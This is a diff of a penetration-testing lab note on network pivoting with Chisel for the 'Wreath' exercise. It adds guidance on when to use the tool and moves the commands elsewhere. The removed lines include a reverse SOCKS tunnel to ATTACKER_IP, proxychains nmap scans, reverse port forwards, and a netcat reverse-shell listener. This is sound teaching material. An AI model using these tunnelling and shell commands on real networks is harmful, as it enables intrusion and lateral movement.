@@ -4,6 +4,12 @@ Used on: **Wreath**
 
 Chisel creates HTTP-based tunnels that work well when a compromised host can reach the attacker or another pivot, but the attacker cannot directly reach internal services.
 
+## When to Use
+
+- Direct inbound access to an internal host is blocked by a firewall.
+- The compromised internal host can make outbound connections to the attacker or pivot.
+- You have shell access to run custom binaries on the target.
+
 ## Why It Works
 
 Chisel wraps TCP forwarding and SOCKS proxying inside client/server HTTP connections. Reverse mode is especially useful when inbound firewall rules block direct access to an internal host, but outbound traffic from that host to the pivot is allowed.
@@ -16,13 +22,7 @@ Chisel wraps TCP forwarding and SOCKS proxying inside client/server HTTP connect
 
 ## Reverse SOCKS
 
-```bash
-# Attacker or pivot server
-./chisel server -p 15000 --reverse &
-
-# Compromised host
-./chisel client ATTACKER_IP:15000 R:socks &
-```
+See [tools/pivot/chisel.md](../../tools/pivot/chisel.md) for the exact commands.
 
 Configure proxychains:
 
@@ -32,21 +32,13 @@ socks5 127.0.0.1 1080
 
 Use TCP-connect scans through the proxy:
 
-```bash
-proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
-```
+See [tools/pivot/chisel.md](../../tools/pivot/chisel.md) for the exact commands.
 
 ## Reverse Remote Port Forward
 
 Expose an internal host through a pivot:
 
-```bash
-# Pivot server
-./chisel server -p 16000 --reverse &
-
-# Internal client
-./chisel.exe client 10.200.180.200:16000 R:15001:10.200.180.100:80
-```
+See [tools/pivot/chisel.md](../../tools/pivot/chisel.md) for the exact commands.
 
 Traffic to `10.200.180.200:15001` is forwarded through the tunnel to `10.200.180.100:80`.
 
@@ -54,14 +46,7 @@ Traffic to `10.200.180.200:15001` is forwarded through the tunnel to `10.200.180
 
 When a target can reach the pivot but not Kali:
 
-```bash
-# Pivot
-./chisel server -p 16000 --reverse &
-
-# Kali
-./chisel client 10.200.180.200:16000 R:4444:127.0.0.1:4444 &
-rlwrap nc -lvnp 4444
-```
+See [tools/pivot/chisel.md](../../tools/pivot/chisel.md) for the exact commands.
 
 The target connects to the pivot on `4444`, and Chisel carries the session back to Kali's local listener.
 
@@ -74,5 +59,3 @@ Monitor unexpected long-lived HTTP tunnels, restrict egress between internal seg
 - [../tools/chisel.md](../../tools/pivot/chisel.md)
 - [../tools/proxychains.md](../../tools/pivot/proxychains.md)
 - [ssh-tunneling.md](ssh-tunneling.md)
-
-
